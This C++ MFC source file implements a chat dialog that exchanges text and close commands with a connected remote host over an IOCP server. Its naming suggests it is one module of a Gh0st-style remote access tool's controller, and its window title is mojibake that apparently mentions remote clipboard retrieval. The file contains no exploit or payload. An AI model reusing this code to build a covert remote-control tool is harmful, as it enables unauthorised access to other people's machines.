// MyChat.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "MyChat.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyChat dialog


CMyChat::CMyChat(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CMyChat::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMyChat)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	
	
	m_bIsOfflineRecord = (BYTE)m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1];
}


void CMyChat::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyChat)
	DDX_Control(pDX, IDC_EDIT_NEWTEXT1, m_newtext);
	DDX_Control(pDX, IDC_EDIT_CHAT1, m_chat);
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CMyChat, CDialog)
	//{{AFX_MSG_MAP(CMyChat)
	ON_BN_CLICKED(IDC_BUTTON_SEND1, OnButtonSend)
	ON_BN_CLICKED(IDC_BUTTON_END, OnButtonEnd)
	ON_WM_CLOSE()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyChat message handlers

BOOL CMyChat::OnInitDialog() 
{
	CDialog::OnInitDialog();
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - Ô¶³Ì»ñÈ¡¼ôÇÐ°å", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	// TODO: Add extra initialization here
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

void CMyChat::OnReceiveComplete()
{
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	CString strResult = m_pContext->m_DeCompressionBuffer.GetBuffer(0);
	SetDlgItemText(IDC_EDIT_CHAT1,strResult);
	m_chat.SetSel(strlen(strResult),strlen(strResult),FALSE);
}


void CMyChat::OnButtonSend() 
{
	char str[250];
	GetDlgItemText(IDC_EDIT_NEWTEXT1,str,sizeof(str));
	if (strcmp(str,"")==0)
	{
		return;
	}
	m_iocpServer->Send(m_pContext, (LPBYTE)str,strlen(str));
}


void CMyChat::OnClose() 
{
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialog::OnClose();
}

void CMyChat::OnButtonEnd() 
{
	// TODO: Add your control notification handler code here
	BYTE bToken = COMMAND_CHAT_CLOSE;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}